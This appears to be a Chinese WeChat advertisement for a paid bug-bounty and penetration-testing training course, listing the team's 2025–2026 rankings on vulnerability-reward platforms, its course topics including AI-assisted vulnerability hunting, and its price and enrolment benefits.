![](https://mmbiz.qpic.cn/sz_mmbiz_png/EL1yQYzv6RpXc24k1JYGxLA89trBry5yYP0biaEd6ljbwPgnAashzKG8JA2gRNyuE3DklaXvSPmres8ocAM3wSSpHzfRL6X5HwUJX4pjbehc/640?from=appmsg "")  
  
PART.02  
  
  
挖洞有没有成绩介绍？  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZDHiayEzyt870FWQg0ZdaNuq3nMgnZrASHYqznaMKcVD7cE4F4iccJM35sWZytlKVe6DV0gOmS2caibg3mUMmc8cxErpFvXmLf9W99udVBd9Uk/640?from=appmsg "")  
  
01  
  
EDUSRC&CNVD&企业SRC  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9swdDnKgkCYWGrQV3g2v7D8QiaiaS4z5UF8h1x9licWXYD6WIaJ3IzUZkiaQPaPia86ibI2dxAAiajD7AvOEYNgYA7Tc8qNQnwZh0aC9ibajhjccJiaw/640?from=appmsg "")  
  
  
下面是我们团队成员的一些荣誉总结，欢迎随时查询，我们只做真材实料的培训，助力你完成自己的就业网安大厂目标 or 副业赏金目标！  
  
（2026年未截止，部分排名会有上下微小浮动）  
  
  
EDUSRC 2026年榜团队榜第一  
  
EDUSRC 2026年榜个人榜单第一  
  
EDUSRC 2026年榜个人榜单第五  
  
EDUSRC 2026年榜个人榜单第九  
  
EDUSRC 2026年榜个人榜单第十  
  
EDUSRC 2025年榜个人榜单第一  
  
EDUSRC 2025年榜团队榜第四  
  
EDUSRC 全平台团队榜第三  
  
EDUSRC 全平台个人榜第四  
  
EDUSRC 常态化演习个人榜单第四  
  
蚂蚁集团SRC 2026年榜第五  
  
国通星驿SRC 2026年榜第一  
  
国通星驿SRC 2026总榜第三  
  
网易SRC 2026年榜第一  
  
看云SRC 2026年榜第二  
  
法大大SRC 2026年榜第二  
  
补天-北森云SRC 2026年榜第二  
  
补天-人教社SRC 2026年榜第四  
  
UCloud-SRC 2026年榜第三  
  
UCloud-SRC 2026年榜第四  
  
麦当劳SRC 2026年榜第三  
  
麦当劳SRC 2026年榜第八  
  
爱奇艺SRC 2026年榜第四  
  
喜马拉雅SRC 2026年榜第五  
  
喜马拉雅SRC 2026年榜第十  
  
Soul-SRC 2026年榜第七  
  
途虎安全SRC 2026年榜第五  
  
途虎安全SRC 2026年榜第八  
  
途虎安全SRC 2026年榜第十  
  
知识星球SRC 2026年榜第七  
  
敦煌网SRC 2026年榜第三  
  
合合安全SRC 2026年榜第九  
  
新东方SRC 2026年榜第九  
  
哈罗出行SRC 2025年榜第八  
  
唯品会SRC 2025年榜第六  
  
NCC国家网络空间安全云社区-产能榜第六  
  
  
更多成绩具体详情图可以看这个：  
  
[猎洞时刻SRC挖洞&入职培训｜近期成绩 （文末抽奖）](https://mp.weixin.qq.com/s?__biz=MzkyNTUyNTE5OA==&mid=2247490991&idx=1&sn=478c4ec5cd1d512c79492d10a93addab&scene=21#wechat_redirect)  
  
  
EDUSRC 2026年榜团队榜第一  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup5sXC9DRX9GNIjia5XEbwAPKm6Q8GXhqSuIHSiam4ljCHPI1cuBCic1JWrrG5IIVkWmLH1mFoOhnicSR6M9D7Bj6kSqrHHvV5cGpyQ/640?wx_fmt=png&from=appmsg "")  
  
  
![bd060519f29a48600791b3595e15feb1.png](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup48D2EaTWe2ebroALchoGXZpzlfDbibCMPv0L3JklhgEDlYA2qN30QkfNhQ4l58QvdMkh0YVYIcjLYKHWgbsx7lF6jdibflz0xvA/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=41 "")  
  
2026EDUSRC个人榜，前十名，有四个是来自我们猎洞团队。  
  
EDUSRC 2026年榜个人榜单第一  
  
EDUSRC 2026年榜个人榜单第五  
  
EDUSRC 2026年榜个人榜单第九  
  
EDUSRC 2026年榜个人榜单第十  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup7qBY6CbicXsZInFTLdb5WDb7I354kt0O9js4VhlH6vD5yF2akZK3sYA7ZLGR2OVSqEUJ1bqJuQO1cY6KxUwhMECdSkBH6OHIqU/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=44 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ucA3HFqtup4d1JocvJ0CzzRUWib7AJ2R0LgxZ9U4Oia0VrJJwaIiaibhemcBMSic2EFNcPuG2XrkX28klT62MM8MvWwhCCuVonXkm5Z6z6mU0ibVk/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ucA3HFqtup5XbqKx8NX4ZibM6gKl5EzQvBzdnmdOtxByfvdiciagTianlEJYvbicR1exgG1uG3icxwP6wbUN039lullLTDTCXlG0v2GpX7aafq9Ao/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup6icBib3ffKm9LtLQlfvlXMMBgLFDkTy2VT4qH8prPibe1XSXrsLR7RRkibortZToBMdyiawPnrZv2LzDZqibcXMaDMa1DiaXAUjq9VAs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup7Bd0T4T32s6bSOjw7qgQJYC6oUgFFWRZWibfJV9yHKdJQNS3UE5Et0WlBEyLDwQFPQaqwhX6Cc5dQYEt9l3Wg3D7eaciaiaDCFN4/640?wx_fmt=png&from=appmsg "")  
  
蚂蚁集团SRC2026年榜第五  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup7Bft6cmeKIOEN4HQoZZEDCJqEuGRLiawwGfQYAjmm12tf84L5whPhD9e906ibKic2zbwV6cwLj4KcqhtKhhttbLwAG9WAnibOz2o0/640?wx_fmt=png&from=appmsg "")  
  
网易SRC2026年榜第一  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup4adCGZIfSSc4J3ojA8CC5oV786lGIzgjeoJiaHWmtJhNluwmv4bA3WP56t2C5eo4SdT4ZUSMhl9dsFhAtaVPUntSYtfpD2Zarw/640?wx_fmt=png&from=appmsg "")  
  
看云SRC2026年榜第二，单个漏洞破万元赏金。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup5Xo8ib6HYSGyTdoWI5QWribvCiaibicfW5XpYamb1JcUB20b2H6f8uaGNGDr9uVdGIKJCcOzn2OqESVJ0OUzmf8ysu8VOLGvEP7mXU/640?wx_fmt=png&from=appmsg "")  
  
法大大SRC2026年榜第二  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup7W2Tzo3KucPILic8zuDYPSPYgEhnc108ibaaesAhEo5FyfCGJOmP9LUw8ibdRYAU7Yjt0SUEQ0aUYWCqSS9Bl8sKNrg8sicFSplEA/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=33 "")  
  
麦当劳SRC2026年榜第三  
  
麦当劳SRC2026年榜第八  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup7ibjmnCVbaj5SGOt0Sgh3Gkwicb2K5aFMX8EO6eHApWkwic5WCvQM0uaaW8d9nciaZWqMWjnmKUJX1E1zEGoQbqs3ZYc4I38E1ibo0/640?wx_fmt=png&from=appmsg "")  
  
爱奇艺SRC 2026年榜第四  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup78JgXcwIUicMWdibib9OGobh3m0maWibLgNiasV5g5EOqgaM0ibvZCWpibVZZZN45jt5LGCTvuTSCO9vib3rpj2licE2WialibDcxyTlJ2ak/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=17 "")  
  
Soul SRC 2026年榜第七  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup4vnPoJsuU36xiazl4sdZwSgbYLibGe0spzv0TFl8eYySkg1SDTAdZib0nK7klGPC8JrkxQ5h4AGfsGZm8mzTibibHYBMwO1QBHgPv0/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=24 "")  
  
Ucloud SRC 2026年榜第四和第五  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup6LZbzCwhAZRkicBcvH4bYl5VHfMRV3MGibmvhYyDhLRuIGqo6CaiaPJ7DSs43rRIROvOzK8ZyAAANqT3qPQ9OkhRPIn4LKhTujjo/640?wx_fmt=png&from=appmsg "")  
  
唯品会SRC2025年榜第六  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup4QCZOc0RicfKdBT0PkmB9VCPmv2wibSo24Dj9W6NcBWRhic1Cs15qAOxbEjCTENfMM5G8VGAazeQ2qQlb2MTNadlMBRCJozhpPqg/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=23 "")  
  
还有其他多个企业SRC年榜前十，就不一一列举了。  
  
  
以下众多学员漏洞赏金，单个漏洞赏金破万等。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup6QNm3BZZM7ZVqzsiaNlK7jvW6lBib5pqeMgTAGZRAeHZtrHn8Dexu2V4iabKI5uV6WHppAPhVDRzCqRNNticiaPIXrIVbp3AqCTCibw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup7aRZWFjzoMNPCv3jM4C56bzAPIbAKAOdDHKHTp7LLN4fjaj83BK98qIL5dtpqeJjfrDibntAxJ1sVs5WprMmT5RByPVwqA42jg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup5gx0vRDEtNugy3I6pv7hMrvfLHficNWPCdjkEz4OyCibdLDjDjn8KKYqYtgS2GfpbheurvVrfjkt2mpTBPyqrAyiclic8icrTeLxqA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup6Xfw1tqotTNhVtezd2Dhd6WwQLqUGCtMFKkdtR9nEA78IeMu6qZdfzpHTI4ziao3ap3szks0S8O9l3cfsDWt3pDje6OicnJvk0I/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/d6JIQYCSTHico4s7YfpmcHmWDlhInfXQ3onZicYXP4Uj0ouTBT5XjibfTpA5kiaZzewcDnlKhicLxy12Oa2lm7jhU0g/640?wx_fmt=other&from=appmsg&randomid=vkc2323j&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
更多成绩内容欢迎加我了解！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/sZNhSEe8By4XzViaeg75icD56Zo6C2OO77OKibjbpWDgGImcU2zQZodoXt18qHBQqDnLjZ08HO4UrVUnN66rIs5ajvLmJQYU6ricK2cBgHHODfs/640?from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EL1yQYzv6RpXc24k1JYGxLA89trBry5yYP0biaEd6ljbwPgnAashzKG8JA2gRNyuE3DklaXvSPmres8ocAM3wSSpHzfRL6X5HwUJX4pjbehc/640?from=appmsg "")  
  
PART.03  
  
  
AI自动化渗透挖洞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZDHiayEzyt870FWQg0ZdaNuq3nMgnZrASHYqznaMKcVD7cE4F4iccJM35sWZytlKVe6DV0gOmS2caibg3mUMmc8cxErpFvXmLf9W99udVBd9Uk/640?from=appmsg "")  
  
01  
  
培训内容是否包含AI自动化渗透和AI安全相关内容？  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9swdDnKgkCYWGrQV3g2v7D8QiaiaS4z5UF8h1x9licWXYD6WIaJ3IzUZkiaQPaPia86ibI2dxAAiajD7AvOEYNgYA7Tc8qNQnwZh0aC9ibajhjccJiaw/640?from=appmsg "")  
  
  
关于AI自动化挖洞，这方面我们课程也是当然包含的！我们目前猎洞培训课程第四期，一直都是持续更新与时俱进的！目前AI如此火热，我们当然也会开展相关的能力提升，祝学员们也能掌握AI能力，赋能挖洞和就业！  
  
  
有想要了解的也可以看看下面的文章哦，关于AI挖洞方面的。点击下方链接即可跳转！  
  
  
[AI挖洞目前已经是大势所趋](https://mp.weixin.qq.com/s?__biz=MzkyNTUyNTE5OA==&mid=2247490564&idx=1&sn=fe84fc6c251f6037fa6f67003f149055&scene=21#wechat_redirect)  
  
  
  
也有学员通过AI挖洞，拿到单洞6000元赏金。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup5iceh6K7FNaQJnSUv0hN2xVxQUIiaJF5VYgKbdn2uNicOdyzJUMAynJlVgyYU7icgoeYLhXZOI95BuKiaA3KTpZfczYlyByRgMCcwM/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/sZNhSEe8By4XzViaeg75icD56Zo6C2OO77OKibjbpWDgGImcU2zQZodoXt18qHBQqDnLjZ08HO4UrVUnN66rIs5ajvLmJQYU6ricK2cBgHHODfs/640?from=appmsg "")  
  
  
  
  
猎洞第四期挖洞入职培训介绍  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZDHiayEzyt870FWQg0ZdaNuq3nMgnZrASHYqznaMKcVD7cE4F4iccJM35sWZytlKVe6DV0gOmS2caibg3mUMmc8cxErpFvXmLf9W99udVBd9Uk/640?from=appmsg "")  
  
01  
  
如何联系？价格怎么样？福利有哪些？  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9swdDnKgkCYWGrQV3g2v7D8QiaiaS4z5UF8h1x9licWXYD6WIaJ3IzUZkiaQPaPia86ibI2dxAAiajD7AvOEYNgYA7Tc8qNQnwZh0aC9ibajhjccJiaw/640?from=appmsg "")  
  
  
1、我们目前第四期培训的价格为 1888¥ ，第五期价格预估涨价到两千多。  
  
2、一次报名可以永久每期学习，报名后，之前的1～4期，包含以后的第五期、第六期等都能永久学习，不会二次收费。  
  
3、报名包含一对一解答，包含网安的挖洞实战问题、技术问题、大厂入职规划等问题。  
  
4、报名培训，包含直播课程、录播课程、对应详情课件、工具和赠送知识星球，内部交流技术群。  
  
5、如果是完全零基础的学员，报名第四期，  
会额外赠送一套打基础课程，1～2内足够完成零基础阶段，剩下直接学第四期实战，可以的短期内挖到自己第一个实战漏洞。  
  
6、对于网安方面的考证，如CISP、NISP、PTE均有超低内部价格。  
  
  
  
报名如何联系？扫码加我微信，备注“培训”即可，我来给你详情解答！可以找我了解更多我们的学员成绩！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup6GtnGvOIYXYbOH2UNVQKD2ZfBSvmOMs4ibaRDIesGc7v0aibclQTt6OZpPgdm69JjmHXrJEyBdz1T7EmiatV15lz1XluBkXMFmn8/640?wx_fmt=png&from=appmsg "")  
  
  
下面就是贴一下第四期实战课程课表和赠送的零基础课程课表。  
  
  
  
  
Part 01  
  
![](https://mmecoa.qpic.cn/sz_mmecoa_gif/wCXxeZIKEBLevtPDS3ffqMuEJXkwLCHiaEdicyYhTGVGHRPPc5Mxs8MdHW5hpPg9d4VlChq6unVNxZgDlkOUxmWPn2eBXj1AyQxFRnJwMS990/640?from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/I7v1x5D6icYW4cNXqF7dQDQwDVQ8MdAJojCWCGuvvTFazzrGpQCia5Gwp3IqNNgydwW9Rusrd43Z259a3mYIOciciaPp0XCnOAib59qrA2Q80JibU/640?from=appmsg "")  
  
  
第四期实战培训课表  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cr9YyS063QrVstianyX9gPA4EZicfkbyKdBQyPtQHPwSLJePicuZmXcBiaLaRSTWrY6UibPpAaeNxLjOSiaeHaSvdHMg/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/CGEwnc7DGPkXwCkjLX8HzCgjKO1KuxPTWw8L9BNNTM3b8WVfHQxV3vIibDycqksck67KWnnVu75ctUZFfpde2kw/640?from=appmsg "")  
  
覆盖企业赏金SRC，众测赏金，Edusrc，cnvd和工作项目渗透挖掘。  
  
内容方面主要是AI大模型赋能网络安全、AI自动化挖洞和逆向、Web挖洞、小程序挖洞、APP挖洞、JS逆向、云安全、护网培训、项目漏洞实战、前端vue路由渗透等内容。  
  
  
你直接按照我这个课程路线走（送零基础），半年可以达到人家学生无指导情况下自学2–3年的效果，很多学生还在学C语言、学PHP、Java的时候，你已经步入实战搞赏金了。  
  
  
下面都是一些课件内容。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup7m5rT4icCKzn020oh6vlQ2BYgAwu7U16p8vDgFjgMwlVIzNUVC08U3KN3WZ2Urnb0Dxkr7PLlTTtVO6qwjscC7uibwVlia8V6nRY/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup6ByTKVvlkO3Sl6L5ibFNpml7RKl03qYhGyGGetgsWxI6YzLKNtQ79IJnOFHfGHagN2xoKTjQkicJ5QGbl9ynPmqbJb40icQqTuvQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=91 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup76NxtgBcKPCBNPWERnxwG4T7l0K12JX03JFRicibPsQOhRnMpj67SmWhibtOXRjvdn6w9nKSlawCMYTjss7ATVS8jos3yVmtnmng/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=93 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup74HCfgmuDiacG3lwW1YM5lgcMh4fuic745QHjNet6dGY2ib4sbLzUNHVg2RxJBk64msgAValkI0LWStJcRQic8Llv0ziaCuZc2Vjaw/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=94 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup6ByTKVvlkO3Sl6L5ibFNpml7RKl03qYhGyGGetgsWxI6YzLKNtQ79IJnOFHfGHagN2xoKTjQkicJ5QGbl9ynPmqbJb40icQqTuvQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=91 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/66Px0lScLmhsSQ81eCsVKJ3rdZkSvWiajhKcPGVl5T8wjtDrfJwp0JOA6IpdLIBVawKV3q1zsXaOP95lR6Gm0zg/640?from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/UKNVa82CwibfF1ovv4q3fnQ8sib70fohUsibxRVGetvW2trw171icE2PACxlWpIbLOATzduVTL40KNS6GEalG5tqDxdoibe57mYApibHRb4j8iaSyc/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XNw8Gs7pfmhLibl5aWHeBYCtCO74HXfmFDj5PcJUHfBG4To3m8gGZG1dUFIM5hTU24zSeuQvpZjicc29nJfkuIrxUukkyLBfLpribX42eTqAzY/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucA3HFqtup45Wug1n4EGjKGvwd0BmUlN6rv4D4UtI6UicFTeicukqpmHLquzgxJPgVGpYmNO0umQHdfMJ8zpOxczibHQKnLEghdhhp5Cw4errk/640?wx_fmt=png&from=appmsg "")  
  
  
Part 02  
  
![](https://mmecoa.qpic.cn/sz_mmecoa_gif/wCXxeZIKEBLevtPDS3ffqMuEJXkwLCHiaEdicyYhTGVGHRPPc5Mxs8MdHW5hpPg9d4VlChq6unVNxZgDlkOUxmWPn2eBXj1AyQxFRnJwMS990/640?from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/I7v1x5D6icYW4cNXqF7dQDQwDVQ8MdAJojCWCGuvvTFazzrGpQCia5Gwp3IqNNgydwW9Rusrd43Z259a3mYIOciciaPp0XCnOAib59qrA2Q80JibU/640?from=appmsg "")  
  
  
零基础培训课表  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup6oGf4hxvbeichYWyMkqiaeibGtXzATgia5IWtgI6hBnqkrCO5hFBiapIQlfHbnmbwU3khMCQQc04LHGbeREQSk9pnaHhumUq2lib4cQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/sZNhSEe8By4XzViaeg75icD56Zo6C2OO77OKibjbpWDgGImcU2zQZodoXt18qHBQqDnLjZ08HO4UrVUnN66rIs5ajvLmJQYU6ricK2cBgHHODfs/640?from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/PRjdmUELtVDZsOJib3BlegVyicZrfRqrkUKQ2sIP9mwxpzUymkzJrv7ZbXh9rJdWGeAJdlkFtQGCBgd5XmaqJdMEzusgnCkyPeGYrn75kcKc0/640?from=appmsg "")  
  
END  
  
  
有想法的朋友，欢迎来找我咨询！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ucA3HFqtup6bvzcgcFuDJ0HX1ibRBS1ZvWYqKTK7Sp7uboeOephL9e0xaCh3icmYWM58kwopTJdhCa8FRfLVR63jbmwGCwS7iaPFAskT2B0gqQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zOpksvrDPHytc93z86c7OicUUa77PH9rdAtqjQP6OkoBQNK4LQoDJliahUYePoS13at5QDTNzxq45n4gMFXySVdKoxbCWftLBliblQpvpstfcs/640?from=appmsg "")  
  
  
  
  
